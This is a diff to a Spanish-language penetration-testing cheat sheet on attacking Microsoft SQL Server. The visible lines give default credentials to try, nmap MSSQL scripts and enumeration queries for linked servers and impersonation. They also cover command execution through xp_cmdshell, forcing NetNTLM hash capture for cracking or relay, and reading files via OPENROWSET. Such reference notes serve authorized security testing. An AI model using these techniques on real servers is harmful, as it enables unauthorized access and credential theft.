@@ -37,7 +37,7 @@ Credenciales por defecto que valen probar: `sa:(vacía)`, `sa:sa`, `sa:Password1
 
 | Comando | Qué da |
 |---|---|
-| `nmap -sV --script "ms-sql-info,ms-sql-empty-password,ms-sql-ntlm-info,ms-sql-config" -p1433 HOST` | Versión, cuentas sin contraseña, info NTLM (nombre de host/dominio) |
+| `nmap -sV --script "ms-sql-*" -p1433 HOST` | Versión, cuentas sin contraseña, info NTLM (nombre de host/dominio) |
 
 `ms-sql-ntlm-info` saca el dominio y el hostname sin autenticarse — útil aun sin credenciales.
 
@@ -52,8 +52,8 @@ Credenciales por defecto que valen probar: `sa:(vacía)`, `sa:sa`, `sa:Password1
 | Linked servers | `SELECT srvname FROM master..sysservers;` |
 | Quién puedo impersonar | `SELECT b.name FROM sys.server_permissions a JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id WHERE a.permission_name='IMPERSONATE';` |
 
-## RCE por `xp_cmdshell`
 
+## RCE por `xp_cmdshell`
 La vía directa a comandos del SO. Requiere sysadmin (o impersonarlo).
 
 ```sql
@@ -75,7 +75,6 @@ En `impacket-mssqlclient` hay atajos: `enable_xp_cmdshell` y luego `xp_cmdshell 
 Los linked servers suelen correr con más privilegio en el destino que el que tenés en el origen — cadena de escalada/lateral clásica de SQL Server.
 
 ## Capturar / relayear NetNTLM
-
 Forzar al servicio a autenticarse contra vos: sale el hash NetNTLMv2 de la **cuenta de servicio** de SQL.
 
 | Tarea | SQL / comando |
@@ -92,6 +91,7 @@ El hash capturado se crackea, o se reenvía con [[Relay de NTLM]] si el destino 
 | Leer un archivo | `SELECT * FROM OPENROWSET(BULK N'C:\Windows\win.ini', SINGLE_CLOB) AS x;` |
 | Listar un directorio | `EXEC master..xp_dirtree 'C:\', 1, 1;` |
 
+
 ## Errores frecuentes
 
 | Síntoma | Causa | Salida |
@@ -100,3 +100,4 @@ El hash capturado se crackea, o se reenvía con [[Relay de NTLM]] si el destino 
 | `xp_cmdshell` deshabilitado | no está prendido | la secuencia `sp_configure` de arriba (requiere sysadmin) |
 | `EXECUTE AS` rechazado | sin permiso `IMPERSONATE` | enumerar a quién sí podés impersonar |
 | instancia con nombre no conecta | no sabés el puerto dinámico | consultar el SQL Browser 1434/udp (`nmap -sU -p1434`) |
+
